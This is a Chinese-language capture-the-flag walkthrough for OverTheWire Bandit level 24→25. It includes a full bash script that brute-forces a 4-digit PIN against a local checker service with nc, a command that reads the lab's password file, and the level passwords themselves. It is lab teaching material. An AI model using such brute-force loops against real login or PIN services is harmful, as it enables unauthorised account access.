# Bandit Level 24 → Level 25 攻略 🔢

## 关卡目标 🎯

本关卡的目标是编写一个脚本，通过暴力破解一个4位数字PIN码，将当前级别的密码和PIN码提交到本地主机的30002端口，以获取下一关的密码。

## 所需知识 📚

### 暴力破解 🔨

暴力破解是一种通过尝试所有可能的组合来找到正确答案的方法。在这个关卡中，我们需要尝试所有可能的4位数字PIN码（0000-9999）。

### Shell脚本循环 🔄

我们需要使用shell脚本的循环结构来生成所有可能的PIN码。

### 网络通信 🌐

我们需要使用网络工具（如`nc`）将密码和PIN码发送到指定的端口。

### 文件I/O和重定向 📄

我们需要使用文件I/O和重定向来处理大量的输出数据。

## 详细解题步骤 📝

### 1. 登录游戏服务器 🔐

使用上一关获得的密码登录服务器：

```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

密码：`UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ`

### 2. 获取当前级别的密码 🔑

我们需要知道当前级别（bandit24）的密码，以便发送给服务器：

```bash
cat /etc/bandit_pass/bandit24
```

输出结果应该显示bandit24的密码：

```
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

### 3. 测试服务器 🧪

首先，我们可以尝试连接到服务器，看看它的响应：

```bash
echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1234" | nc localhost 30002
```

输出结果可能类似于：

```
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line separated by a space.
Wrong! Please enter the correct pincode. Try again.
```

这表明我们需要提供正确的密码和PIN码才能获取下一关的密码。

### 4. 创建临时目录 📂

我们需要创建一个临时目录来存储我们的脚本和输出文件：

```bash
mkdir -p /tmp/bandit24_to_25
cd /tmp/bandit24_to_25
```

### 5. 编写暴力破解脚本 📝

现在我们需要编写一个脚本，生成所有可能的PIN码并将它们与密码一起发送到服务器：

```bash
nano brute_force.sh
```

在编辑器中输入以下内容：

```bash
#!/bin/bash

password="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

# 生成所有可能的PIN码并将它们与密码一起保存到文件中
for pin in {0000..9999}; do
    echo "$password $pin"
done > pins.txt

# 将生成的密码和PIN码发送到服务器
cat pins.txt | nc localhost 30002 > output.txt

# 查找包含密码的行
grep -v "Wrong" output.txt
```

保存并退出编辑器（在nano中，按Ctrl+O保存，然后按Ctrl+X退出）。

### 6. 设置脚本权限 🔒

我们需要确保脚本具有执行权限：

```bash
chmod +x brute_force.sh
```

### 7. 执行脚本 🚀

现在我们可以执行脚本：

```bash
./brute_force.sh
```

脚本会生成所有可能的PIN码，将它们与密码一起发送到服务器，并将输出保存到`output.txt`文件中。这个过程可能需要一些时间。

### 8. 查看结果 🔍

脚本执行完成后，我们可以查看输出文件，找到包含密码的行：

```bash
cat output.txt | grep -v "Wrong"
```

输出结果应该包含下一关的密码：

```
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line separated by a space.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```

### 9. 优化方法（可选）🔄

上述方法可能需要较长时间执行。我们可以使用更高效的方法，例如将PIN码分批发送：

```bash
#!/bin/bash

password="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

# 创建一个临时文件
touch result.txt

# 分批生成PIN码并发送
for i in {0..9}; do
    for j in {0..9}; do
        for k in {0..9}; do
            for l in {0..9}; do
                echo "$password $i$j$k$l"
            done
        done
    done | nc localhost 30002 >> result.txt
done

# 查找包含密码的行
grep -v "Wrong" result.txt
```

这个脚本将PIN码分成多批发送，可能会更快地找到正确的PIN码。

## 命令解释 🔍

- `for pin in {0000..9999}; do echo "$password $pin"; done > pins.txt`：
  - `for pin in {0000..9999}; do ... done`：循环生成所有可能的4位数字PIN码
  - `echo "$password $pin"`：将密码和PIN码组合成一行
  - `> pins.txt`：将输出重定向到`pins.txt`文件
- `cat pins.txt | nc localhost 30002 > output.txt`：
  - `cat pins.txt`：读取`pins.txt`文件的内容
  - `|`：管道操作符，将前一个命令的输出作为后一个命令的输入
  - `nc localhost 30002`：使用netcat连接到本地主机的30002端口
  - `> output.txt`：将输出重定向到`output.txt`文件
- `grep -v "Wrong" output.txt`：
  - `grep`：搜索文本
  - `-v`：反向匹配，显示不包含指定模式的行
  - `"Wrong"`：要排除的模式
  - `output.txt`：要搜索的文件

## 学习要点总结 📌

1. **暴力破解基础** - 学习了如何使用暴力破解方法尝试所有可能的组合
2. **Shell脚本循环** - 了解了如何使用shell脚本的循环结构生成数据
3. **网络通信** - 学习了如何使用netcat与网络服务通信
4. **文件I/O和重定向** - 了解了如何使用文件I/O和重定向处理大量数据

## 提示 💡

- 暴力破解是一种最后手段的方法，通常效率较低，但在某些情况下是唯一的选择
- 在实际应用中，应该尽量避免使用暴力破解，因为它可能违反服务条款或法律
- 使用分批处理可以提高暴力破解的效率，但仍然需要较长时间
- 在处理大量数据时，使用文件而不是直接在终端显示可以提高效率

## 下一步 ⏭️

使用获得的密码登录到Level 25：

```bash
ssh bandit25@bandit.labs.overthewire.org -p 2220
```

密码：`uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG`

## 相关资源 🔗

- [Bash循环结构详解](./resource/level24→level25/Bash循环结构详解.md)
- [Netcat (nc) 命令详解](./resource/level24→level25/Netcat命令详解.md)
- [Linux文件I/O和重定向](./resource/level24→level25/Linux文件IO和重定向.md)
